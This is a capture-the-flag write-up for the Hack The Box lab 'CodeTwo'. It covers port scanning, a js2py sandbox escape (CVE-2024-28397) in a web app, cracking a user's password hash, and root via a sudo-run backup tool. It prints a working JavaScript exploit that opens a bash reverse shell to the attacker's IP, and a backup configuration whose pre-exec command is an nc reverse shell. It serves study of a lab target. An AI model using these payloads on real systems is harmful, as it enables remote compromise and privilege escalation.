--------------

### CTF-: HACKTHEBOX
### LAB-: Codetwo

--------------

<img width="793" height="169" alt="image" src="https://github.com/user-attachments/assets/4c25ec09-54f9-424e-a491-fee1245cd66a" />

--------------

- Rustscan's result-:

```bash
╭─   ~/labs/htb/editor                
╰─❯ rustscan -a 10.10.11.82 -- -sC -sV  
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
RustScan: allowing you to send UDP packets into the void 1200x faster than NMAP

[~] The config file is expected to be at "/home/sensei/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.11.82:22
Open 10.10.11.82:8000
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -sC -sV" on ip 10.10.11.82
Depending on the complexity of the script, results may take some time to appear.
[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-20 13:05 WAT
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:05
Completed NSE at 13:05, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:05
Completed NSE at 13:05, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:05
Completed NSE at 13:05, 0.00s elapsed
Initiating Ping Scan at 13:05
Scanning 10.10.11.82 [4 ports]
Completed Ping Scan at 13:05, 0.24s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 13:05
Scanning codetwo (10.10.11.82) [2 ports]
Discovered open port 22/tcp on 10.10.11.82
Discovered open port 8000/tcp on 10.10.11.82
Completed SYN Stealth Scan at 13:05, 0.22s elapsed (2 total ports)
Initiating Service scan at 13:05
Scanning 2 services on codetwo (10.10.11.82)
Completed Service scan at 13:05, 7.43s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.11.82.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:05
Completed NSE at 13:05, 9.47s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:05
Completed NSE at 13:05, 1.44s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:05
Completed NSE at 13:05, 0.01s elapsed
Nmap scan report for codetwo (10.10.11.82)
Host is up, received echo-reply ttl 63 (0.21s latency).
Scanned at 2025-08-20 13:05:40 WAT for 19s

PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a0:47:b4:0c:69:67:93:3a:f9:b4:5d:b3:2f:bc:9e:23 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCnwmWCXCzed9BzxaxS90h2iYyuDOrE2LkavbNeMlEUPvMpznuB9cs8CTnUenkaIA8RBb4mOfWGxAQ6a/nmKOea1FA6rfGG+fhOE/R1g8BkVoKGkpP1hR2XWbS3DWxJx3UUoKUDgFGSLsEDuW1C+ylg8UajGokSzK9NEg23WMpc6f+FORwJeHzOzsmjVktNrWeTOZthVkvQfqiDyB4bN0cTsv1mAp1jjbNnf/pALACTUmxgEemnTOsWk3Yt1fQkkT8IEQcOqqGQtSmOV9xbUmv6Y5ZoCAssWRYQ+JcR1vrzjoposAaMG8pjkUnXUN0KF/AtdXE37rGU0DLTO9+eAHXhvdujYukhwMp8GDi1fyZagAW+8YJb8uzeJBtkeMo0PFRIkKv4h/uy934gE0eJlnvnrnoYkKcXe+wUjnXBfJ/JhBlJvKtpLTgZwwlh95FJBiGLg5iiVaLB2v45vHTkpn5xo7AsUpW93Tkf+6ezP+1f3P7tiUlg3ostgHpHL5Z9478=
|   256 7d:44:3f:f1:b1:e2:bb:3d:91:d5:da:58:0f:51:e5:ad (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBErhv1LbQSlbwl0ojaKls8F4eaTL4X4Uv6SYgH6Oe4Y+2qQddG0eQetFslxNF8dma6FK2YGcSZpICHKuY+ERh9c=
|   256 f1:6b:1d:36:18:06:7a:05:3f:07:57:e1:ef:86:b4:85 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEJovaecM3DB4YxWK2pI7sTAv9PrxTbpLG2k97nMp+FM
8000/tcp open  http    syn-ack ttl 63 Gunicorn 20.0.4
| http-methods: 
|_  Supported Methods: HEAD GET OPTIONS
|_http-server-header: gunicorn/20.0.4
|_http-title: Welcome to CodeTwo
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                                                                                                                                              
```

- Port `8000`-:

<img width="717" height="710" alt="image" src="https://github.com/user-attachments/assets/8976f564-ef18-4fbe-96ee-9d4a7eea2258" />

- The app's source code was provided for the challenge.

<img width="576" height="544" alt="image" src="https://github.com/user-attachments/assets/6305dd36-9faa-473b-b23f-d8e70264e571" />

- I checked the `app.py` and discovered a vulnerable python module `js2py`.The vulnerable function `js2py.eval_js()` allows attackers to bypass the sandbox restrictions and execute python code as explained [here](https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape).

```python
def run_code():
    try:
        code = request.json.get('code')
        result = js2py.eval_js(code)
        return jsonify({'result': result})
    except Exception as e:
        return jsonify({'error': str(e)})
```

- Proof-of-concept to execute shell-:

```js
// [+] command goes here:
let cmd = "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.128/8081 0>&1'"
let hacked, bymarve, n11
let getattr, obj

hacked = Object.getOwnPropertyNames({})
bymarve = hacked.__getattribute__
n11 = bymarve("__getattribute__")
obj = n11("__class__").__base__
getattr = obj.__getattribute__

function findpopen(o) {
    let result;
    for(let i in o.__subclasses__()) {
        let item = o.__subclasses__()[i]
        if(item.__module__ == "subprocess" && item.__name__ == "Popen") {
            return item
        }
        if(item.__name__ != "type" && (result = findpopen(item))) {
            return result
        }
    }
}

n11 = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate()
console.log(n11)
n11
```

-  Shell-:

<img width="1102" height="274" alt="image" src="https://github.com/user-attachments/assets/dc1d1767-6af2-4c5c-9193-834281b65570" />

-------------

### User `Marco`

-------------

- The server contains a db where I checked for credentials.

<img width="831" height="120" alt="image" src="https://github.com/user-attachments/assets/fd7410e7-ccff-4720-9f52-6387585d0691" />

- I discovered an hash for user `Marco`.

<img width="1639" height="218" alt="image" src="https://github.com/user-attachments/assets/b7c33cc5-873b-430b-a580-64c84659318b" />

- Cracked it with `crackstation.net`.

<img width="1270" height="429" alt="image" src="https://github.com/user-attachments/assets/a952f4d4-b82b-46ad-ba00-04c9d2d23925" />

- User `marco`-:

<img width="735" height="86" alt="image" src="https://github.com/user-attachments/assets/76cd9886-9ef9-497c-b243-ad5c08093720" />

-----------------

### Privilege Escalation

-----------------

- User `marco` can run this as root.

<img width="1274" height="181" alt="image" src="https://github.com/user-attachments/assets/6705a258-ad63-4506-91fc-b642f6906d2f" />

- I checked the configuration file and noticed that we can execute shell commands before a task.We can use this to execute shell commands.

<img width="577" height="221" alt="image" src="https://github.com/user-attachments/assets/12f1db00-4d0c-48d6-98fa-eb6e29c179a1" />

- Configuration file's proof of concept-:

```yaml
conf_version: 3.0.1
repos:
  default:
    repo_uri: /home/marco/backups/
    repo_group: default_group
    backup_opts:
      paths:
      - /tmp/
      tags: []
      minimum_backup_size_error: 400 Kib
      exclude_files_larger_than: 0.0 Kib
    repo_opts:
      repo_password: test
      upload_speed: 100.0 Mib
      download_speed: 0.0 Kib
      retention_policy: {}
    prometheus: {}
    env:
      env_variables: {}
      encrypted_env_variables: {}
groups:
  default_group:
    backup_opts:
      paths: []
      source_type:
      tags: []
      compression: auto
      use_fs_snapshot: false
      ignore_cloud_files: true
      exclude_caches: true
      one_file_system: true
      priority: low
      excludes_case_ignore: false
      exclude_files:
      - excludes/generic_excluded_extensions
      - excludes/generic_excludes
      - excludes/windows_excludes
      - excludes/linux_excludes
      exclude_patterns:
      exclude_files_larger_than:
      additional_parameters:
      additional_backup_only_parameters:
      minimum_backup_size_error: 10 MiB
      pre_exec_commands: ["rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.128 8081 >/tmp/f"]
      pre_exec_per_command_timeout: 3600
      pre_exec_failure_is_fatal: false
      post_exec_commands: []
      post_exec_per_command_timeout: 3600
      post_exec_failure_is_fatal: false
      post_exec_execute_even_on_backup_error: true
      post_backup_housekeeping_percent_chance: 0
      post_backup_housekeeping_interval: 0
    repo_opts:
      repo_password:
      repo_password_command:
      minimum_backup_age: 1435
      random_delay_before_backup: 3
      upload_speed: 100 Mib
      download_speed: 0 Mib
      backend_connections: 0
      retention_policy:
        last: 3
        hourly: 72
        daily: 30
        weekly: 4
        monthly: 12
        yearly: 3
        keep_tags: []
        apply_on_tags: []
        keep_within: true
        ntp_server:
      prune_max_unused: 0 B
      prune_max_repack_size:
    prometheus:
      backup_job: ${MACHINE_ID}
      group: ${MACHINE_GROUP}
    env:
      env_variables: {}
      encrypted_env_variables: {}
identity:
  machine_id: ${HOSTNAME}__Zo6u
  machine_group:
global_prometheus:
  metrics: false
  instance: ${MACHINE_ID}
  destination:
  http_username:
  http_password:
  additional_labels: {}
global_options:
  auto_upgrade: false
  auto_upgrade_percent_chance: 15
  auto_upgrade_interval: 0
  auto_upgrade_server_url:
  auto_upgrade_server_username:
  auto_upgrade_server_password:
  auto_upgrade_host_identity: ${MACHINE_ID}
  auto_upgrade_group: ${MACHINE_GROUP}
```

- Trigger it by trying to backup with option `-b`.

```bash
sudo /usr/local/bin/npbackup-cli -c me.conf -b
```

<img width="841" height="420" alt="image" src="https://github.com/user-attachments/assets/13a5bb26-9b6a-4197-a43e-6e235555bd2c" />

- Root-:

<img width="830" height="574" alt="image" src="https://github.com/user-attachments/assets/d96a1091-d8d9-45ff-94a4-f8c4b3f04e06" />

----------

### Reference

-----------

- [js2py](https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape)

-----------
